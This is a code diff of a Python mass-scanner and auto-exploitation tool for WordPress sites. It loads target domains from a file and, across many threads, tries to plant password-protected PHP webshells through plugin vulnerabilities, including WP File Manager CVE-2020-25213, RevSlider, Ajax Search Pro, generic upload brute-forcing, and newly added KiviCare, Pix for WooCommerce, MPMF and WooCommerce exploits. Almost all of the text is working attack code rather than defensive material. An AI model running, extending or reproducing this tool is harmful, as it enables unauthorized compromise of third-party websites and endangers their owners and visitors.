@@ -675,33 +1023,19 @@ class WPFileManagerExploit:
                             print(f"    [+] Version {version} is vulnerable to CVE-2020-25213")
                             return True
                         else:
-                            print(f"    [-] Version {version} is not vulnerable (requires 6.0-6.8)")
+                            print(f"    [-] Version {version} is not vulnerable")
                             return False
                     except:
-                        print(f"    [-] Unable to parse version number")
                         return None
-                else:
-                    print(f"    [-] Unable to detect version")
-                    return None
-            else:
-                return None
-        except Exception as e:
+            return None
+        except:
             return None
     
     def exploit_cve_2020_25213(self, target_url, auto_shell=True):
-        """
-        CVE-2020-25213: WP File Manager 6.0-6.8 Unauthenticated RCE
-        Uploads actual PHP shell directly
-        """
         print(f"\n  {CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
-        
-        # First check version
-        print(f"    {CYAN}[*]{RESET} Checking plugin version...")
-        version_vuln = self.check_version_cve_2020_25213(target_url)
         
         endpoint_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
         
-        # Check if endpoint is vulnerable
         try:
             check_response = self.session.get(endpoint_url, timeout=5)
             if check_response.status_code == 200:
@@ -710,30 +1044,27 @@ class WPFileManagerExploit:
                     if 'error' in json_response and 'errUnknownCmd' in str(json_response['error']):
                         print(f"    {GREEN}[+]{RESET} Target vulnerable to CVE-2020-25213")
                     else:
-                        print(f"    {RED}[-]{RESET} Target not vulnerable to CVE-2020-25213")
-                        return False, "Not vulnerable to CVE-2020-25213"
+                        print(f"    {RED}[-]{RESET} Target not vulnerable")
+                        return False, "Not vulnerable"
                 except:
-                    print(f"    {RED}[-]{RESET} Target not vulnerable to CVE-2020-25213")
-                    return False, "Not vulnerable to CVE-2020-25213"
+                    print(f"    {RED}[-]{RESET} Target not vulnerable")
+                    return False, "Not vulnerable"
             else:
                 print(f"    {RED}[-]{RESET} Endpoint not accessible")
                 return False, "Endpoint not accessible"
         except Exception as e:
-            print(f"    {RED}[-]{RESET} Error checking vulnerability: {str(e)}")
+            print(f"    {RED}[-]{RESET} Error: {str(e)}")
             return False, f"Error: {str(e)}"
         
-        # If auto_shell, upload a shell using the exact exploit payload
         if auto_shell:
-            print(f"    {CYAN}[*]{RESET} Uploading actual PHP shell via CVE-2020-25213...")
-            shell_name = f"aezeron_shell_{random.randint(1000, 9999)}.php"
+            print(f"    {CYAN}[*]{RESET} Uploading shell via CVE-2020-25213...")
+            shell_name = f"aezeron_{random.randint(1000, 9999)}.php"
             
-            # Create temporary file with actual shell content
             temp_shell = tempfile.mktemp(suffix='.php')
             try:
                 with open(temp_shell, 'w') as f:
                     f.write(SIMPLE_SHELL)
                 
-                # Exact payload from the bash exploit
                 files = {
                     'upload[]': (shell_name, open(temp_shell, 'rb'), 'application/x-php')
                 }
@@ -746,13 +1077,11 @@ class WPFileManagerExploit:
                 }
                 
                 headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'User-Agent': 'Mozilla/5.0',
                     'X-Requested-With': 'XMLHttpRequest'
                 }
                 
                 exploit_response = self.session.post(endpoint_url, files=files, data=data, headers=headers, timeout=10)
-                
-                # Clean up temp file
                 os.remove(temp_shell)
                 
                 if exploit_response.status_code == 200:
@@ -761,317 +1090,74 @@ class WPFileManagerExploit:
                         if 'added' in json_response and len(json_response['added']) > 0:
                             shell_path = json_response['added'][0].get('url')
                             if shell_path:
-                                full_shell_url = urljoin(target_url, shell_path)
-                                if self.verify_shell(full_shell_url):
-                                    print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {full_shell_url}?p={SHELL_PASSWORD}")
-                                    return True, f"CVE-2020-25213 Shell: {full_shell_url}?p={SHELL_PASSWORD}"
+                                full_url = urljoin(target_url, shell_path)
+                                if self.verify_shell(full_url):
+                                    print(f"    {GREEN}[SHELL]{RESET} Shell uploaded: {full_url}?p={SHELL_PASSWORD}")
+                                    return True, f"CVE-2020-25213 Shell: {full_url}?p={SHELL_PASSWORD}"
                     except:
-                        # Try alternative path
                         alt_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
                         if self.verify_shell(alt_url):
-                            print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {alt_url}?p={SHELL_PASSWORD}")
+                            print(f"    {GREEN}[SHELL]{RESET} Shell uploaded: {alt_url}?p={SHELL_PASSWORD}")
                             return True, f"CVE-2020-25213 Shell: {alt_url}?p={SHELL_PASSWORD}"
-                        
-                        # Check if shell.php was uploaded
-                        shell_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/../files/shell.php')
-                        if self.verify_shell(shell_url):
-                            print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {shell_url}?p={SHELL_PASSWORD}")
-                            return True, f"CVE-2020-25213 Shell: {shell_url}?p={SHELL_PASSWORD}"
                 
-                print(f"    {RED}[-]{RESET} CVE-2020-25213 exploit failed")
                 return False, "Exploit failed"
-                
             except Exception as e:
                 if os.path.exists(temp_shell):
                     os.remove(temp_shell)
-                print(f"    {RED}[-]{RESET} CVE-2020-25213 error: {str(e)}")
                 return False, f"Error: {str(e)}"
         
-        return True, "Target vulnerable to CVE-2020-25213"
+        return True, "Target vulnerable"
     
-    def exploit_wp_file_manager(self, target_url):
-        # First try the specific CVE-2020-25213 exploit
-        success, msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
-        if success:
-            return success, msg
-        
-        # Fall back to original exploit method
-        exploit_paths = [
-            'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
-            'wp-content/plugins/wp-file-manager/lib/php/connector.php'
-        ]
-        
-        for path in exploit_paths:
-            exploit_url = urljoin(target_url, path)
-            
-            try:
-                check_response = self.session.get(exploit_url, timeout=5)
-                
-                if check_response.status_code == 200:
-                    files = {
-                        'upload[]': ('shell.php', SIMPLE_SHELL, 'application/x-php')
-                    }
-                    
-                    data = {
-                        'cmd': 'upload',
-                        'target': 'l1_',
-                        'reqid': '174117272919' + str(random.randint(100, 999))
-                    }
-                    
-                    headers = {
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                        'X-Requested-With': 'XMLHttpRequest',
-                        'Referer': urljoin(target_url, 'wp-admin/admin.php?page=wp_file_manager')
-                    }
-                    
-                    exploit_response = self.session.post(exploit_url, files=files, data=data, headers=headers, timeout=10)
-                    
-                    if exploit_response.status_code == 200:
-                        try:
-                            json_response = exploit_response.json()
-                            if 'added' in json_response and len(json_response['added']) > 0:
-                                shell_path = json_response['added'][0].get('url', json_response['added'][0].get('name'))
-                                full_shell_url = urljoin(target_url, shell_path)
-                                
-                                if self.verify_shell(full_shell_url):
-                                    return True, f"Shell uploaded: {full_shell_url}?p={SHELL_PASSWORD}"
-                        except:
-                            if 'shell.php' in exploit_response.text or 'added' in exploit_response.text:
-                                shell_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/../files/shell.php')
-                                if self.verify_shell(shell_url):
-                                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
-                    
-                    return False, f"Exploit attempt failed"
-                
-            except Exception as e:
-                continue
-        
-        return False, "File Manager not vulnerable"
-    
-    def exploit_ajax_search_pro(self, target_url):
-        exploit_path = 'wp-content/plugins/ajax-search-pro/js/file_upload.php'
-        exploit_url = urljoin(target_url, exploit_path)
-        
-        try:
-            check_response = self.session.get(exploit_url, timeout=5)
-            
-            if check_response.status_code == 200:
-                files = {
-                    'files[]': ('shell.php', SIMPLE_SHELL, 'application/x-php')
-                }
-                
-                exploit_response = self.session.post(exploit_url, files=files, timeout=10)
-                
-                if exploit_response.status_code == 200:
-                    try:
-                        json_response = exploit_response.json()
-                        if 'files' in json_response and len(json_response['files']) > 0:
-                            shell_name = json_response['files'][0]['name']
-                            shell_url = urljoin(target_url, f'wp-content/plugins/ajax-search-pro/js/{shell_name}')
-                            
-                            if self.verify_shell(shell_url):
-                                return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
-                    except:
-                        if '.php' in exploit_response.text:
-                            shell_url = urljoin(target_url, 'wp-content/plugins/ajax-search-pro/js/shell.php')
-                            if self.verify_shell(shell_url):
-                                return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
-                
-                return False, f"Ajax Search Pro exploit failed"
-            
-            return False, f"Ajax Search Pro not accessible"
-            
-        except Exception as e:
-            return False, f"Ajax Search Pro error: {str(e)}"
-    
-    def exploit_revslider(self, target_url):
-        exploit_path = 'wp-content/plugins/revslider/temp/update_extract/revslider/update.php'
-        exploit_url = urljoin(target_url, exploit_path)
-        
-        try:
-            shell_name = f'revshell{random.randint(1000, 9999)}.php'
-            
-            files = {
-                'update_file': (shell_name, SIMPLE_SHELL, 'application/x-php')
-            }
-            
-            data = {
-                'action': 'revslider_ajax_action',
-                'client_action': 'update_plugin'
-            }
-            
-            exploit_response = self.session.post(exploit_url, files=files, data=data, timeout=10)
-            
-            if exploit_response.status_code == 200:
-                shell_url = urljoin(target_url, f'wp-content/plugins/revslider/temp/update_extract/revslider/{shell_name}')
-                
-                if self.verify_shell(shell_url):
-                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
-            
-            return False, f"RevSlider exploit failed"
-            
-        except Exception as e:
-            return False, f"RevSlider error: {str(e)}"
-    
-    def brute_force_upload(self, target_url):
-        upload_paths = [
-            'wp-content/plugins/formidable/php/upload.php',
-            'wp-admin/async-upload.php',
-            'wp-admin/media-upload.php',
-        ]
-        
-        for path in upload_paths:
-            upload_url = urljoin(target_url, path)
-            
-            try:
-                test_response = self.session.get(upload_url, timeout=3)
-                
-                if test_response.status_code in [200, 403]:
-                    shell_name = f'upload_{random.randint(1000, 9999)}.php'
-                    
-                    files = {
-                        'file': (shell_name, SIMPLE_SHELL, 'application/x-php'),
-                    }
-                    
-                    upload_response = self.session.post(upload_url, files=files, timeout=10)
-                    
-                    if upload_response.status_code == 200:
-                        possible_paths = [
-                            f'wp-content/uploads/{shell_name}',
-                            f'wp-content/plugins/formidable/{shell_name}',
-                            shell_name
-                        ]
-                        
-                        for shell_path in possible_paths:
-                            shell_url = urljoin(target_url, shell_path)
-                            try:
-                                if self.verify_shell(shell_url):
-                                    return True, f"Shell uploaded: {shell_url}?p={SHELL_PASSWORD}"
-                            except:
-                                continue
-                
-            except:
-                continue
-        
-        return False, "Brute force upload failed"
-
-    def attempt_generic_upload(self, target_url):
-        try:
-            shell_name = f'up_{random.randint(1000, 9999)}.php'
-            params = ['file', 'upload', 'Filedata', 'files[]', 'image', 'media']
-            
-            for param in params:
-                try:
-                    files = {param: (shell_name, SIMPLE_SHELL, 'application/x-php')}
-                    resp = self.session.post(target_url, files=files, timeout=10)
-                    
-                    if resp.status_code == 200:
-                        paths = [
-                            urljoin(target_url, shell_name),
-                            urljoin(target_url, f'wp-content/uploads/{shell_name}'),
-                        ]
-                        
-                        for p in paths:
-                            if self.verify_shell(p):
-                                return True, f"Shell uploaded: {p}?p={SHELL_PASSWORD}"
-                except:
-                    continue
-        except:
-            pass
-        return False, "Generic upload failed"
-
-    def crawl_directory_listing(self, url, current_depth=0, max_depth=3):
-        found_shells = []
-        if current_depth > max_depth:
-            return found_shells
-            
-        try:
-            response = self.session.get(url, timeout=10)
-            if response.status_code == 200:
-                links = re.findall(r'href=["\']?([^"\' >]+)', response.text)
-                
-                for link in links:
-                    link = link.split('?')[0].split('#')[0]
-                    
-                    if not link or link.startswith('?') or '://' in link or link.startswith('../'):
-                        continue
-                        
-                    full_url = urljoin(url, link)
-                    
-                    if not full_url.startswith(url):
-                        continue
-
-                    ext = os.path.splitext(link)[1].lower()
-
-                    if ext in ['.php', '.phtml', '.php5']:
-                        try:
-                            if self.verify_shell(full_url):
-                                found_shells.append(f"{full_url}?p={SHELL_PASSWORD}")
-                                print(f"    {GREEN}[FOUND]{RESET} Shell found: {full_url}")
-                        except:
-                            pass
-                    
-                    elif link.endswith('/'):
-                        if full_url.rstrip('/') != url.rstrip('/'):
-                            found_shells.extend(self.crawl_directory_listing(full_url, current_depth + 1, max_depth))
-                        
-        except:
-            pass
-        return found_shells
-    
-    def check_writable_directories(self, target_url):
-        test_directories = [
-            'wp-content/uploads/',
-            'wp-content/plugins/',
-            'wp-content/themes/',
-        ]
-        
-        found_shells = []
-        writable_dirs = []
-        
-        for directory in test_directories:
-            test_url = urljoin(target_url, directory)
-            
-            try:
-                response = self.session.get(test_url, timeout=3)
-                
-                if response.status_code == 200:
-                    if 'Index of' in response.text or '<title>Index of' in response.text:
-                        writable_dirs.append(directory)
-                        print(f"{GREEN}[+]{RESET} Directory listing enabled: {test_url}")
-                        
-                        idx_success, idx_shell = self.exploit_index_of(test_url)
-                        if idx_success:
-                            found_shells.append(f"{idx_shell}?p={SHELL_PASSWORD}")
-                            print(f"{GREEN}[SHELL]{RESET} Index Of Exploit Success: {idx_shell}")
-                        
-                        shells = self.crawl_directory_listing(test_url)
-                        if shells:
-                            found_shells.extend(shells)
-            except:
-                pass
-        
-        return writable_dirs, found_shells
-    
-    def auto_exploit(self, target_url, elementor_creds=None):
+    def auto_exploit(self, target_url, elementor_creds=None, mpmf_form_name=None, pix_command=None, pix_interactive=False, kivicare_email=None, kivicare_login_type="google"):
         results = {
             'file_manager': False,
-            'ajax_search': False,
-            'revslider': False,
-            'brute_upload': False,
-            'cve_2020_25213': False,
-            'admin_ajax_rce': False,
+            'woocommerce': False,
+            'mpmf_rce': False,
+            'pix_rce': False,
+            'kivicare_bypass': False,
             'elementor_rce': False,
+            'admin_ajax_rce': False,
+            'cve_2020_25213': False,
             'shell_urls': [],
             'details': []
         }
         
-        print(f"{CYAN}[*]{RESET} Checking writable directories...")
-        writable_dirs, found_shells = self.check_writable_directories(target_url)
-        if writable_dirs:
-            results['details'].append(f"Writable directories: {', '.join(writable_dirs)}")
-        if found_shells:
-            results['shell_urls'].extend(found_shells)
+        # Test KiviCare Auth Bypass (CVE-2026-2991)
+        if kivicare_email:
+            print(f"{CYAN}[*]{RESET} Testing KiviCare Auth Bypass (CVE-2026-2991)...")
+            kivicare_result, kivicare_msg = self.exploit_kivicare_auth_bypass(target_url, kivicare_email, kivicare_login_type)
+            results['kivicare_bypass'] = kivicare_result
+            results['details'].append(f"[KiviCare] {kivicare_msg}")
+        
+        # Test Pix for WooCommerce RCE (CVE-2026-3891)
+        print(f"{CYAN}[*]{RESET} Testing Pix for WooCommerce RCE (CVE-2026-3891)...")
+        pix_result, pix_msg = self.exploit_pix_woocommerce_rce(target_url, pix_command, pix_interactive)
+        results['pix_rce'] = pix_result
+        results['details'].append(f"[Pix] {pix_msg}")
+        if pix_result and "Shell" in pix_msg:
+            shell_part = pix_msg.split(': ')[1] if ': ' in pix_msg else pix_msg
+            if shell_part not in results['shell_urls']:
+                results['shell_urls'].append(shell_part)
+        
+        # Test MPMF RCE (CVE-2024-50526)
+        print(f"{CYAN}[*]{RESET} Testing MPMF RCE (CVE-2024-50526)...")
+        mpmf_result, mpmf_msg = self.exploit_mpmf_rce(target_url, mpmf_form_name)
+        results['mpmf_rce'] = mpmf_result
+        results['details'].append(f"[MPMF] {mpmf_msg}")
+        if mpmf_result and "Shell" in mpmf_msg:
+            shell_part = mpmf_msg.split(': ')[1] if ': ' in mpmf_msg else mpmf_msg
+            if shell_part not in results['shell_urls']:
+                results['shell_urls'].append(shell_part)
+        
+        # Test WooCommerce RCE (CVE-2024-51793)
+        print(f"{CYAN}[*]{RESET} Testing WooCommerce RCE (CVE-2024-51793)...")
+        woo_result, woo_msg = self.exploit_woocommerce_rce(target_url)
+        results['woocommerce'] = woo_result
+        results['details'].append(f"[WooCommerce] {woo_msg}")
+        if woo_result and "Shell" in woo_msg:
+            shell_part = woo_msg.split(': ')[1] if ': ' in woo_msg else woo_msg
+            if shell_part not in results['shell_urls']:
+                results['shell_urls'].append(shell_part)
         
         # Test Elementor RCE if credentials provided
         if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
@@ -1089,18 +1175,8 @@ class WPFileManagerExploit:
                 if shell_part not in results['shell_urls']:
                     results['shell_urls'].append(shell_part)
         
-        # Test admin-ajax.php RCE
-        print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
-        ajax_result, ajax_msg = self.exploit_admin_ajax_auto(target_url)
-        results['admin_ajax_rce'] = ajax_result
-        results['details'].append(f"[AdminAjaxRCE] {ajax_msg}")
-        if ajax_result and "Shell" in ajax_msg:
-            shell_part = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
-            if shell_part not in results['shell_urls']:
-                results['shell_urls'].append(shell_part)
-        
-        # Test CVE-2020-25213 specifically
-        print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
+        # Test CVE-2020-25213
+        print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213...")
         cve_result, cve_msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
         results['cve_2020_25213'] = cve_result
         results['details'].append(f"[CVE-2020-25213] {cve_msg}")
@@ -1109,44 +1185,15 @@ class WPFileManagerExploit:
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        print(f"{CYAN}[*]{RESET} Testing WP File Manager exploit...")
-        fm_result, fm_msg = self.exploit_wp_file_manager(target_url)
-        results['file_manager'] = fm_result
-        results['details'].append(f"[FileManager] {fm_msg}")
-        if fm_result:
-            shell_part = fm_msg.split(': ')[1] if ': ' in fm_msg else fm_msg
+        # Test admin-ajax RCE
+        print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
+        ajax_result, ajax_msg = self.exploit_admin_ajax_rce(target_url)
+        results['admin_ajax_rce'] = ajax_result
+        results['details'].append(f"[AdminAjax] {ajax_msg}")
+        if ajax_result and "Shell" in ajax_msg:
+            shell_part = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
-        
-        print(f"{CYAN}[*]{RESET} Testing Ajax Search Pro exploit...")
-        ajax_result2, ajax_msg2 = self.exploit_ajax_search_pro(target_url)
-        results['ajax_search'] = ajax_result2
-        results['details'].append(f"[AjaxSearch] {ajax_msg2}")
-        if ajax_result2:
-            shell_part = ajax_msg2.split(': ')[1] if ': ' in ajax_msg2 else ajax_msg2
-            if shell_part not in results['shell_urls']:
-                results['shell_urls'].append(shell_part)
-        
-        print(f"{CYAN}[*]{RESET} Testing RevSlider exploit...")
-        rev_result, rev_msg = self.exploit_revslider(target_url)
-        results['revslider'] = rev_result
-        results['details'].append(f"[RevSlider] {rev_msg}")
-        if rev_result:
-            shell_part = rev_msg.split(': ')[1] if ': ' in rev_msg else rev_msg
-            if shell_part not in results['shell_urls']:
-                results['shell_urls'].append(shell_part)
-        
-        print(f"{CYAN}[*]{RESET} Testing brute force upload...")
-        brute_result, brute_msg = self.brute_force_upload(target_url)
-        results['brute_upload'] = brute_result
-        results['details'].append(f"[BruteUpload] {brute_msg}")
-        if brute_result:
-            shell_part = brute_msg.split(': ')[1] if ': ' in brute_msg else brute_msg
-            if shell_part not in results['shell_urls']:
-                results['shell_urls'].append(shell_part)
-        
-        if not any([fm_result, ajax_result2, rev_result, brute_result, cve_result, ajax_result, results['elementor_rce']]):
-            results['details'].append("All exploit attempts failed")
         
         return results
 
@@ -1230,7 +1277,7 @@ def check_wordpress_site(base_url):
     
     return False
 
-def scan_single_target(target_url, exploit=False, elementor_creds=None):
+def scan_single_target(target_url, exploit=False, elementor_creds=None, interactive=False, mpmf_form_name=None, pix_command=None, pix_interactive=False, kivicare_email=None, kivicare_login_type="google"):
     result = {
         'url': target_url,
         'is_wordpress': False,
@@ -1263,9 +1310,43 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None):
         if exploit:
             exploiter = WPFileManagerExploit()
             
+            # Try KiviCare Auth Bypass (CVE-2026-2991)
+            if kivicare_email:
+                print(f"{CYAN}[*]{RESET} Testing KiviCare Auth Bypass...")
+                kivicare_success, kivicare_msg = exploiter.exploit_kivicare_auth_bypass(target_url, kivicare_email, kivicare_login_type)
+                if kivicare_success:
+                    print(f"  {GREEN}[BYPASS]{RESET} {kivicare_msg}")
+            
+            # Try Pix for WooCommerce RCE (CVE-2026-3891)
+            print(f"{CYAN}[*]{RESET} Testing Pix for WooCommerce RCE...")
+            pix_success, pix_msg = exploiter.exploit_pix_woocommerce_rce(target_url, pix_command, pix_interactive)
+            if pix_success and "Shell" in pix_msg:
+                shell_url = pix_msg.split(': ')[1] if ': ' in pix_msg else pix_msg
+                if shell_url not in result['shell_urls']:
+                    result['shell_urls'].append(shell_url)
+                print(f"  {GREEN}[SHELL]{RESET} {pix_msg}")
+            
+            # Try MPMF RCE
+            print(f"{CYAN}[*]{RESET} Testing MPMF RCE...")
+            mpmf_success, mpmf_msg = exploiter.exploit_mpmf_rce(target_url, mpmf_form_name)
+            if mpmf_success and "Shell" in mpmf_msg:
+                shell_url = mpmf_msg.split(': ')[1] if ': ' in mpmf_msg else mpmf_msg
+                if shell_url not in result['shell_urls']:
+                    result['shell_urls'].append(shell_url)
+                print(f"  {GREEN}[SHELL]{RESET} {mpmf_msg}")
+            
+            # Try WooCommerce RCE
+            print(f"{CYAN}[*]{RESET} Testing WooCommerce RCE...")
+            woo_success, woo_msg = exploiter.exploit_woocommerce_rce(target_url)
+            if woo_success and "Shell" in woo_msg:
+                shell_url = woo_msg.split(': ')[1] if ': ' in woo_msg else woo_msg
+                if shell_url not in result['shell_urls']:
+                    result['shell_urls'].append(shell_url)
+                print(f"  {GREEN}[SHELL]{RESET} {woo_msg}")
+            
             # Try Elementor RCE if credentials provided
             if elementor_creds and elementor_creds.get('username') and elementor_creds.get('password'):
-                print(f"{CYAN}[*]{RESET} Testing Elementor RCE (requires authentication)...")
+                print(f"{CYAN}[*]{RESET} Testing Elementor RCE...")
                 elementor_success, elementor_msg = exploiter.exploit_elementor(
                     target_url, 
                     elementor_creds['username'], 
@@ -1278,45 +1359,8 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None):
                         result['shell_urls'].append(shell_url)
                     print(f"  {GREEN}[SHELL]{RESET} {elementor_msg}")
             
-            # Try admin-ajax.php RCE
-            print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
-            ajax_success, ajax_msg = exploiter.exploit_admin_ajax_auto(target_url)
-            if ajax_success and "Shell" in ajax_msg:
-                shell_url = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
-                if shell_url not in result['shell_urls']:
-                    result['shell_urls'].append(shell_url)
-                print(f"  {GREEN}[SHELL]{RESET} {ajax_msg}")
-            
-            # Try CVE-2020-25213
-            print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213...")
-            cve_success, cve_msg = exploiter.exploit_cve_2020_25213(target_url, auto_shell=True)
-            if cve_success and "Shell" in cve_msg:
-                shell_url = cve_msg.split(': ')[1] if ': ' in cve_msg else cve_msg
-                if shell_url not in result['shell_urls']:
-                    result['shell_urls'].append(shell_url)
-                print(f"  {GREEN}[SHELL]{RESET} {cve_msg}")
-            
-            if plugin_results:
-                print(f"{CYAN}[*]{RESET} Attempting to exploit found plugins...")
-                for plugin in plugin_results:
-                    name = plugin['plugin']
-                    success = False
-                    msg = ""
-
-                    if name in ['wp-file-manager', 'wp-file-manager-old']:
-                        success, msg = exploiter.exploit_wp_file_manager(target_url)
-                    elif name == 'ajax-search-pro':
-                        success, msg = exploiter.exploit_ajax_search_pro(target_url)
-                    elif name == 'revslider':
-                        success, msg = exploiter.exploit_revslider(target_url)
-
-                    if success:
-                        shell_url = msg.split(': ')[1] if ': ' in msg else msg
-                        if shell_url not in result['shell_urls']:
-                            result['shell_urls'].append(shell_url)
-                        print(f"  {GREEN}[SHELL]{RESET} {msg}")
-            
-            exploit_result = exploiter.auto_exploit(target_url, elementor_creds)
+            # Try other exploits
+            exploit_result = exploiter.auto_exploit(target_url, elementor_creds, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type)
             result['exploit_results'] = exploit_result
             for shell in exploit_result.get('shell_urls', []):
                 if shell not in result['shell_urls']:
@@ -1324,7 +1368,7 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None):
     
     return result
 
-def mass_scan_targets(targets, max_workers=30, exploit=False, elementor_creds=None):
+def mass_scan_targets(targets, max_workers=30, exploit=False, elementor_creds=None, interactive=False, mpmf_form_name=None, pix_command=None, pix_interactive=False, kivicare_email=None, kivicare_login_type="google"):
     results = []
     wp_sites = 0
     vulnerable_sites = 0
@@ -1337,10 +1381,10 @@ def mass_scan_targets(targets, max_workers=30, exploit=False, elementor_creds=No
     print(f"\n{BLUE}[*]{RESET} Starting WP Exploit Scanner for {CYAN}{total}{RESET} targets")
     if exploit:
         print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED")
-        print(f"{RED}[!]{RESET} Exploits: CVE-2020-25213, Admin Ajax RCE, Elementor RCE (if creds provided)")
+        print(f"{RED}[!]{RESET} Exploits: KiviCare Bypass, Pix for WooCommerce, MPMF RCE, WooCommerce RCE, CVE-2020-25213, Admin Ajax RCE, Elementor RCE")
     
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        future_to_target = {executor.submit(scan_single_target, target, exploit, elementor_creds): target for target in targets}
+        future_to_target = {executor.submit(scan_single_target, target, exploit, elementor_creds, interactive, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type): target for target in targets}
         
         for future in as_completed(future_to_target):
             completed += 1
@@ -1456,28 +1500,28 @@ def save_results(results, filename="wp_exploit_results.txt"):
     except Exception as e:
         print(f"{RED}[!]{RESET} Error saving results: {e}")
 
+def kivicare_banner():
+    banner_text = f"""
+{PINK}{BOLD}
+  _____   _____   ___ __ ___  __    ___ ___  ___  _ 
+ / __\\ \\ / / __|_|_  )  \\_  )/ / __|_  ) _ \\/ _ \\/ |
+ | (__\\ V /| _|___/ / () / // _ \\___/ /\\_, /\\_, /| |
+ \\___| \\_/ |___| /___\\__/___\\___/  /___|/_/  /_/ |_|
+{RESET}
+  {PINK}{BOLD}CVE-2026-2991 - KiviCare Auth Bypass | CVE-2026-3891 - Pix for WooCommerce RCE{RESET}
+  {PINK}{BOLD}CVE-2024-50526 - MPMF RCE | CVE-2024-51793 - WooCommerce RCE | CVE-2020-25213 - File Manager{RESET}
+"""
+    print(banner_text)
+
 def main():
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
 
-    banner = f"""
-{RED}
-██╗    ██╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
-██║    ██║██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
-██║ █╗ ██║██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
-██║███╗██║██╔═══╝     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
-╚███╔███╔╝██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
- ╚══╝╚══╝ ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
-                                                                            
-        MULTI-EXPLOIT SCANNER: File Manager + Admin Ajax + Elementor
-                    (Actual PHP Shell - No file_put_contents)
-{RESET}
-"""
+    kivicare_banner()
     
-    print(banner)
-    
+    # Multi-target scan mode (default)
     filename = input(f"\n{YELLOW}[?]{RESET} Enter filename with domains/URLs: ").strip()
     
     if not os.path.exists(filename):
@@ -1499,6 +1543,19 @@ def main():
     
     exploit_input = input(f"{YELLOW}[?]{RESET} Enable auto exploit? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
     exploit = exploit_input == 'y'
+    interactive = False
+    
+    # KiviCare email (optional)
+    kivicare_email = None
+    kivicare_login_type = "google"
+    if exploit:
+        print(f"\n{CYAN}[*]{RESET} KiviCare Auth Bypass (CVE-2026-2991) requires target email")
+        use_kivicare = input(f"{YELLOW}[?]{RESET} Attempt KiviCare bypass? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
+        if use_kivicare == 'y':
+            kivicare_email = input(f"{YELLOW}[?]{RESET} Target email address: ").strip()
+            login_type = input(f"{YELLOW}[?]{RESET} Login type (google/apple) [{CYAN}google{RESET}]: ").strip().lower()
+            if login_type in ['google', 'apple']:
+                kivicare_login_type = login_type
     
     # Elementor credentials (optional)
     elementor_creds = None
@@ -1511,16 +1568,38 @@ def main():
             if username and password:
                 elementor_creds = {'username': username, 'password': password}
     
+    # MPMF form name (optional)
+    mpmf_form_name = None
+    if exploit:
+        mpmf_form_input = input(f"{YELLOW}[?]{RESET} Enter MPMF form name (or press Enter for auto-detect): ").strip()
+        if mpmf_form_input:
+            mpmf_form_name = mpmf_form_input
+    
+    # Pix command (optional)
+    pix_command = None
+    pix_interactive = False
+    if exploit:
+        pix_cmd_input = input(f"{YELLOW}[?]{RESET} Enter command to run on Pix shell (or press Enter to skip): ").strip()
+        if pix_cmd_input:
+            pix_command = pix_cmd_input
+    
     print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
     if exploit:
         print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED")
+        print(f"{RED}[!]{RESET} Exploits: KiviCare Bypass, Pix for WooCommerce, MPMF, WooCommerce, File Manager, Elementor, Admin Ajax")
+        if kivicare_email:
+            print(f"{GREEN}[+]{RESET} KiviCare target email: {kivicare_email}")
         if elementor_creds:
-            print(f"{GREEN}[+]{RESET} Elementor exploit will be attempted with provided credentials")
+            print(f"{GREEN}[+]{RESET} Elementor exploit will be attempted")
